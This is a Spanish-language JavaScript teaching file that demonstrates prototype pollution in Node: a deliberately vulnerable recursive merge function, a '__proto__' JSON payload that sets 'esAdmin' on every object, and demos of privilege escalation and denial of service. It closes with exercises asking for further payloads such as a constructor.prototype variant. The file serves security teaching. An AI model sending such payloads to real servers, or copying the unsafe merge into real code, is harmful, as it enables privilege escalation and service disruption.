// ============================================================
//  5.A  Contaminacion de prototipos: el ataque
// ============================================================
//  Todo lo del bloque 1 en una sola frase: si escribo en
//  Object.prototype, escribo en TODOS los objetos del proceso.
//
//  Este archivo es el ataque. El de al lado es el arreglo.

// --- La funcion vulnerable. Aparece en todos los proyectos.
function fusionar(destino, origen) {
  for (const clave in origen) {
    if (typeof origen[clave] === 'object' && origen[clave] !== null) {
      if (typeof destino[clave] !== 'object' || destino[clave] === null) {
        destino[clave] = {};
      }
      fusionar(destino[clave], origen[clave]);     // recursion
    } else {
      destino[clave] = origen[clave];
    }
  }
  return destino;
}

// Uso legitimo: configuracion por defecto + configuracion del usuario.
const porDefecto = { umbral: { max: 30, min: 5 }, notificar: true };
console.log('uso normal:', JSON.stringify(
  fusionar(structuredClone(porDefecto), { umbral: { max: 40 } })
));

// --- El ataque. Esto es lo que llega en el cuerpo de un POST.
const cuerpoMalicioso = JSON.parse('{"__proto__": {"esAdmin": true}}');

console.log('\nantes del ataque:', ({}).esAdmin);        // undefined

fusionar({}, cuerpoMalicioso);

console.log('despues del ataque:', ({}).esAdmin);        // true  <-- !!!
console.log('un objeto cualquiera:', ({ id: 1 }).esAdmin);
console.log('una instancia de clase:', new (class{})().esAdmin);
console.log('el objeto de otro modulo:', require('node:path').esAdmin);

// Todo objeto que herede de Object.prototype quedo contaminado. En un
// proceso Node eso es, practicamente, todo.

console.log('\n--- Por que anduvo, paso a paso');
// 1. JSON.parse SI crea una propiedad propia llamada "__proto__".
//    (el literal { __proto__: x } es distinto: ese cambia el prototipo)
const j = JSON.parse('{"__proto__": {"a":1}}');
console.log('   JSON.parse crea propiedad propia __proto__:', Object.hasOwn(j, '__proto__'));
// 2. `for...in` la recorre? No siempre... pero la recursion la toca igual.
// 3. Cuando la funcion hace  destino['__proto__']  esta LEYENDO el
//    prototipo real de destino, que es Object.prototype.
// 4. Y entonces  fusionar(Object.prototype, {esAdmin:true})  escribe ahi.
console.log('   destino["__proto__"] es Object.prototype:',
            ({})['__proto__'] === Object.prototype);

console.log('\n--- El impacto real, con tres ejemplos');
// (a) escalada de privilegios sobre un chequeo por propiedad ausente
function puedeBorrar(usuario) { return usuario.esAdmin === true; }
console.log('(a) usuario comun autorizado:', puedeBorrar({ nombre: 'ana' }));

// (b) negacion de servicio: contaminar algo que se usa como texto
Object.prototype.toString = () => { throw new Error('boom'); };
try { String({}); } catch (e) { console.log('(b) String({}) ->', e.message); }
delete Object.prototype.toString;

// (c) cambiar el comportamiento de librerias que hacen  opciones.x ?? default
console.log('(c) cualquier  if (config.debug)  ahora puede ser true sin que nadie lo pidio');

delete Object.prototype.esAdmin;   // limpieza

console.log(`
Nota historica para el pizarron: esto no es teorico. Fue CVE en lodash
(4.17.5), en jQuery (3.4.0), en minimist, en hoek y en un largo etcetera.
Todas son librerias escritas por gente que sabe. La vulnerabilidad no sale
de un descuido: sale del modelo de objetos.
`);

// ------------------------------------------------------------
//  PARA PROBAR VOS
//  1. Proba con  {"constructor": {"prototype": {"esAdmin": true}}}.
//     Anda? Por que? (pista: no hace falta la clave __proto__)
//  2. Escribi el payload JSON que haria que TODO objeto tenga
//     `toJSON` y arruine cualquier respuesta del servidor.
// ------------------------------------------------------------
